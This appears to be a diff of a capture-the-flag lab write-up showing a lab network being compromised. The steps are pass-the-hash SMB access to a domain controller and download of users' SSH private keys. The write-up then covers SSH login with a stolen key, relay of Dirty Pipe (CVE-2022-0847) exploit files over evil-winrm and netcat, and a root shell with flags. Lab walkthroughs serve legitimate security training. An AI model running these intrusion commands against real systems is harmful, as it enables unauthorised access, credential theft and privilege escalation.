+[+] IP: 172.16.8.3:445  Name: DC01.INLANEFREIGHT.LOCAL  Status: ADMIN!!!
         Disk                                                    Permissions     Comment
-        ----                                                    -----------     -------
         ADMIN$                                                  READ, WRITE     Remote Admin
         C$                                                      READ, WRITE     Default share
         Department Shares                                       READ ONLY       Share for department users
-        ./Department Shares
-        dr--r--r--                0 Wed Jun  1 14:34:56 2022    .
-        dr--r--r--                0 Wed Jun  1 14:34:56 2022    ..
-        dr--r--r--                0 Wed Jun  1 14:36:07 2022    Accounting
-        dr--r--r--                0 Wed Jun  1 14:36:00 2022    Executives
-        dr--r--r--                0 Wed Jun  1 14:35:53 2022    Finance
-        dr--r--r--                0 Wed Jun  1 14:35:29 2022    HR
-        dr--r--r--                0 Wed Jun  1 14:35:14 2022    IT
-        dr--r--r--                0 Wed Jun  1 14:35:45 2022    Marketing
-        dr--r--r--                0 Wed Jun  1 14:35:37 2022    R&D
-        ./Department Shares//Accounting
-        dr--r--r--                0 Wed Jun  1 14:36:07 2022    .
-        dr--r--r--                0 Wed Jun  1 14:36:07 2022    ..
-        dr--r--r--                0 Wed Jun  1 14:36:12 2022    Private
-        dr--r--r--                0 Wed Jun  1 14:36:10 2022    Public
-        ./Department Shares//Executives
-        dr--r--r--                0 Wed Jun  1 14:36:00 2022    .
-        dr--r--r--                0 Wed Jun  1 14:36:00 2022    ..
-        dr--r--r--                0 Wed Jun  1 14:36:05 2022    Private
-        dr--r--r--                0 Wed Jun  1 14:36:02 2022    Public
-        ./Department Shares//Finance
-        dr--r--r--                0 Wed Jun  1 14:35:53 2022    .
-        dr--r--r--                0 Wed Jun  1 14:35:53 2022    ..
-        dr--r--r--                0 Wed Jun  1 14:35:57 2022    Private
-        dr--r--r--                0 Wed Jun  1 14:35:55 2022    Public
-        ./Department Shares//HR
-        dr--r--r--                0 Wed Jun  1 14:35:29 2022    .
-        dr--r--r--                0 Wed Jun  1 14:35:29 2022    ..
-        dr--r--r--                0 Wed Jun  1 14:35:32 2022    Private
-        dr--r--r--                0 Wed Jun  1 14:35:34 2022    Public
-        ./Department Shares//IT
-        dr--r--r--                0 Wed Jun  1 14:35:14 2022    .
-        dr--r--r--                0 Wed Jun  1 14:35:14 2022    ..
-        dr--r--r--                0 Wed Jun  1 14:35:16 2022    Private
-        dr--r--r--                0 Wed Jun  1 14:35:14 2022    Public
-        ./Department Shares//IT/Private
-        dr--r--r--                0 Wed Jun  1 14:35:16 2022    .
-        dr--r--r--                0 Wed Jun  1 14:35:16 2022    ..
-        dr--r--r--                0 Wed Jun  1 14:35:16 2022    Development
-        dr--r--r--                0 Wed Jun  1 14:35:19 2022    Networking
         ./Department Shares//IT/Private/Networking
-        dr--r--r--                0 Wed Jun  1 14:35:19 2022    .
-        dr--r--r--                0 Wed Jun  1 14:35:19 2022    ..
         fr--r--r--             1706 Wed Jun  1 14:35:27 2022    harry-id_rsa
         fr--r--r--             1702 Wed Jun  1 14:35:24 2022    james-id_rsa
         fr--r--r--             1706 Wed Jun  1 14:35:22 2022    ssmallsadm-id_rsa
-        ./Department Shares//IT/Public
-        dr--r--r--                0 Wed Jun  1 14:35:14 2022    .
-        dr--r--r--                0 Wed Jun  1 14:35:14 2022    ..
-        dr--r--r--                0 Wed Jun  1 14:35:14 2022    web
-        ./Department Shares//Marketing
-        dr--r--r--                0 Wed Jun  1 14:35:45 2022    .
-        dr--r--r--                0 Wed Jun  1 14:35:45 2022    ..
-        dr--r--r--                0 Wed Jun  1 14:35:50 2022    Private
-        dr--r--r--                0 Wed Jun  1 14:35:48 2022    Public
-        ./Department Shares//R&D
-        dr--r--r--                0 Wed Jun  1 14:35:37 2022    .
-        dr--r--r--                0 Wed Jun  1 14:35:37 2022    ..
-        dr--r--r--                0 Wed Jun  1 14:35:43 2022    Private
-        dr--r--r--                0 Wed Jun  1 14:35:40 2022    Public
-        IPC$                                                    READ ONLY       Remote IPC
-        NETLOGON                                                READ, WRITE     Logon server share 
-        SYSVOL                                                  READ, WRITE     Logon server share 
-[-] Closing connections..                                                                           
+        NETLOGON                                                READ, WRITE     Logon server share
+        SYSVOL                                                  READ, WRITE     Logon server share
 ```
 
-Dowloading:
-
-```bash
-smbmap -u Administrator -p 'aad3b435b51404eeaad3b435b51404ee:fd1f7e5564060258ea787ddbb6e6afa2' -H 172.16.8.3 --download "Department Shares//IT/Private/Networking/harry-id_rsa"
-```
-
-```bash
-smbmap -u Administrator -p 'aad3b435b51404eeaad3b435b51404ee:fd1f7e5564060258ea787ddbb6e6afa2' -H 172.16.8.3 --download "Department Shares//IT/Private/Networking/james-id_rsa"
-```
+bash
 
 ```bash
 smbmap -u Administrator -p 'aad3b435b51404eeaad3b435b51404ee:fd1f7e5564060258ea787ddbb6e6afa2' -H 172.16.8.3 --download "Department Shares//IT/Private/Networking/ssmallsadm-id_rsa"
 ```
 
-ssh access
+---
 
-```
-chmod 600 ssmallsadm-id_rsa
-                                                                                                                
-┌──(kali㉿kali)-[~/labs/aen]
-└─$ ssh ssmallsadm@172.16.9.25 -i ssmallsad-id_rsa
-Warning: Identity file ssmallsad-id_rsa not accessible: No such file or directory.
-** WARNING: connection is not using a post-quantum key exchange algorithm.
-** This session may be vulnerable to "store now, decrypt later" attacks.
-** The server may need to be upgraded. See https://openssh.com/pq.html
-ssmallsadm@172.16.9.25's password: 
+## MGMT01 (172.16.9.25) — SSH Access via Stolen Private Key
 
-                                                                                                                
-┌──(kali㉿kali)-[~/labs/aen]
-└─$ ssh ssmallsadm@172.16.9.25 -i ssmallsadm-id_rsa
-** WARNING: connection is not using a post-quantum key exchange algorithm.
-** This session may be vulnerable to "store now, decrypt later" attacks.
-** The server may need to be upgraded. See https://openssh.com/pq.html
-Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.10.0-051000-generic x86_64)
-
- * Documentation:  https://help.ubuntu.com
- * Management:     https://landscape.canonical.com
- * Support:        https://ubuntu.com/advantage
-
-  System information as of Sun 15 Nov 2026 07:14:20 PM UTC
-
-  System load:  0.0                Processes:               229
-  Usage of /:   27.4% of 13.72GB   Users logged in:         0
-  Memory usage: 11%                IPv4 address for ens160: 172.16.9.25
-  Swap usage:   0%
-
-
-159 updates can be applied immediately.
-103 of these updates are standard security updates.
-To see these additional updates run: apt list --upgradable
-
-
-The list of available updates is more than a week old.
-To check for new updates run: sudo apt update
-Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
-applicable law.
-
-
-Last login: Mon May 23 08:48:13 2022 from 172.16.0.1
-ssmallsadm@MGMT01:~$ ls
-flag.txt
-ssmallsadm@MGMT01:~$ cat flag.txt
-3c4996521690cc76446894da2bf7dd8fssmallsadm@MGMT01:~$ id
-uid=1001(ssmallsadm) gid=1001(ssmallsadm) groups=1001(ssmallsadm)
-ssmallsadm@MGMT01:~$ ls -la
-
-```
-
-Kernel emumeration reveals that the host is vulnerable to dirtypipe:
-
-```
-ssmallsadm@MGMT01:~$ uname -a
-Linux MGMT01 5.10.0-051000-generic #202012132330 SMP Sun Dec 13 23:33:36 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
-ssmallsadm@MGMT01:~$ 
-
-```
-
-Dowloading the poc on kali andf Uploading the exploit files on the DC through evil winrm:
+bash
 
 ```bash
-evil-winrm -i 172.16.8.3 -u Administrator -H fd1f7e5564060258ea787ddbb6e6afa2
-                                        
-Evil-WinRM shell v4.1
-                                        
-Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                                                
-                                        
-Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                           
-                                        
-Info: Establishing connection to remote endpoint
-                                        
-Info: Connection successful
+chmod 600 ssmallsadm-id_rsa
+ssh ssmallsadm@172.16.9.25 -i ssmallsadm-id_rsa
+```
+
+```
+** WARNING: connection is not using a post-quantum key exchange algorithm.
+Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.10.0-051000-generic x86_64)
+
+  IPv4 address for ens160: 172.16.9.25
+
+Last login: Mon May 23 08:48:13 2022 from 172.16.0.1
+ssmallsadm@MGMT01:~$ id
+uid=1001(ssmallsadm) gid=1001(ssmallsadm) groups=1001(ssmallsadm)
+```
+
+bash
+
+```bash
+ssmallsadm@MGMT01:~$ cat flag.txt
+```
+
+**Flag:**
+
+```
+3c4996521690cc76446894da2bf7dd8f
+```
+
+---
+
+## Privilege Escalation on MGMT01 — Dirty Pipe (CVE-2022-0847)
+
+The kernel version is affected by Dirty Pipe:
+
+bash
+
+```bash
+ssmallsadm@MGMT01:~$ uname -a
+```
+
+```
+Linux MGMT01 5.10.0-051000-generic #202012132330 SMP Sun Dec 13 23:33:36 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+```
+
+`MGMT01` has no direct route to Kali, so the PoC files (`compile.sh`, `exploit-1.c`, `exploit-2.c`) are relayed in two hops: uploaded to `DC01` over `evil-winrm`, then sent on from `DC01` to `MGMT01` over the pivot using `nc64.exe`:
+
+bash
+
+```bash
 *Evil-WinRM* PS C:\Users\Administrator\Documents> upload compile.sh
-                                        
-Info: Uploading /home/kali/tools/privesc/CVE-2022-0847-DirtyPipe-Exploits/compile.sh to C:\Users\Administrator\Documents\compile.sh                                                                                             
-                                        
-Data: 92 bytes of 92 bytes copied
-                                        
-Info: Upload successful!
 *Evil-WinRM* PS C:\Users\Administrator\Documents> upload exploit-1.c
-                                        
-Info: Uploading /home/kali/tools/privesc/CVE-2022-0847-DirtyPipe-Exploits/exploit-1.c to C:\Users\Administrator\Documents\exploit-1.c                                                                                           
-                                        
-Data: 7152 bytes of 7152 bytes copied
-                                        
-Info: Upload successful!
 *Evil-WinRM* PS C:\Users\Administrator\Documents> upload exploit-2.c
-                                        
-Info: Uploading /home/kali/tools/privesc/CVE-2022-0847-DirtyPipe-Exploits/exploit-2.c to C:\Users\Administrator\Documents\exploit-2.c                                                                                           
-                                        
-Data: 10336 bytes of 10336 bytes copied
-                                        
-Info: Upload successful!
-*Evil-WinRM* PS C:\Users\Administrator\Documents> ls
-
-
-    Directory: C:\Users\Administrator\Documents
-
-
-Mode                LastWriteTime         Length Name
-----                -------------         ------ ----
--a----       11/15/2026   9:48 AM        7374848 agent.exe
--a----       11/15/2026  11:47 AM             71 compile.sh
--a----       11/15/2026  11:47 AM           5364 exploit-1.c
--a----       11/15/2026  11:47 AM           7752 exploit-2.c
--a----       11/15/2026  10:00 AM              0 LaZagne.exe
--a----       11/15/2026  10:00 AM        1250056 mimikatz.exe
-
-
-```
-
-```
 *Evil-WinRM* PS C:\Users\Administrator\Documents> upload nc64.exe
-                                        
-Info: Uploading /home/kali/tools/nc64.exe to C:\Users\Administrator\Documents\nc64.exe
-                                        
-Data: 60360 bytes of 60360 bytes copied
-
 ```
 
-```
+powershell
+
+```powershell
+# on DC01, sending each file out
 *Evil-WinRM* PS C:\Users\Administrator\Documents> cmd /c "nc64.exe 172.16.9.25 8000 < compile.sh"
-```
-
-```
 *Evil-WinRM* PS C:\Users\Administrator\Documents> cmd /c "nc64.exe 172.16.9.25 8000 < exploit-1.c"
 *Evil-WinRM* PS C:\Users\Administrator\Documents> cmd /c "nc64.exe 172.16.9.25 8000 < exploit-2.c"
 ```
 
-Sending all the files to the target host:
+bash
 
-```
+```bash
+# on MGMT01, receiving each file
 ssmallsadm@MGMT01:~$ nc -lvnp 8000 > compile.sh
-Listening on 0.0.0.0 8000
-Connection received on 172.16.9.3 55400
-^C
-ssmallsadm@MGMT01:~$ ls                                                                                         
-compile.sh  flag.txt                                                                                            
 ssmallsadm@MGMT01:~$ nc -lvnp 8000 > exploit-1.c
-Listening on 0.0.0.0 8000                                                                                       
-Connection received on 172.16.9.3 55410                                                                         
-^C                                                                                                              
-ssmallsadm@MGMT01:~$ ls                                                                                         
-compile.sh  exploit-1.c  flag.txt                                                                               
-ssmallsadm@MGMT01:~$ file exploit-1.c
-exploit-1.c: C source, ASCII text                                                                               
-ssmallsadm@MGMT01:~$ file compile.sh
-compile.sh: Bourne-Again shell script, ASCII text executable                                                    
 ssmallsadm@MGMT01:~$ nc -lvnp 8000 > exploit-2.c
-Listening on 0.0.0.0 8000                                                                                       
-Connection received on 172.16.9.3 55427                                                                         
-^C                                                                               
-
+ssmallsadm@MGMT01:~$ file exploit-1.c
+exploit-1.c: C source, ASCII text
+ssmallsadm@MGMT01:~$ file compile.sh
+compile.sh: Bourne-Again shell script, ASCII text executable
 ```
 
+Once all three files arrive, the exploit is compiled and run:
 
-```                            
-ssmallsadm@MGMT01:~$ ls                                                                                         
-compile.sh  exploit-1.c  exploit-2.c  flag.txt                                                                  
-ssmallsadm@MGMT01:~$ bash compile.sh                                                                            
-ssmallsadm@MGMT01:~$ ls                                                                                         
-compile.sh  exploit-1  exploit-1.c  exploit-2  exploit-2.c  flag.txt                                            
-ssmallsadm@MGMT01:~$ ./exploit-1                                                                                
-Backing up /etc/passwd to /tmp/passwd.bak ...                                                                   
-Setting root password to "piped"...                                                                             
-Password: Restoring /etc/passwd from /tmp/passwd.bak...                                                         
-Done! Popping shell... (run commands now)                                                                       
+bash
+
+```bash
+ssmallsadm@MGMT01:~$ bash compile.sh
+ssmallsadm@MGMT01:~$ ls
+compile.sh  exploit-1  exploit-1.c  exploit-2  exploit-2.c  flag.txt
+ssmallsadm@MGMT01:~$ ./exploit-1
+```
+
+```
+Backing up /etc/passwd to /tmp/passwd.bak ...
+Setting root password to "piped"...
+Password: Restoring /etc/passwd from /tmp/passwd.bak...
+Done! Popping shell... (run commands now)
 id
 uid=0(root) gid=0(root) groups=0(root)
-cd /root     
+cd /root
 ls
 flag.txt  snap
-pwd  
-/root
 cat flag.txt
 206c03861986c0e264438cb6e8e90a19
+```
 
+---
 
+## Flag (MGMT01 Root)
+
+**Flag:**
+
+```
+206c03861986c0e264438cb6e8e90a19
 ```
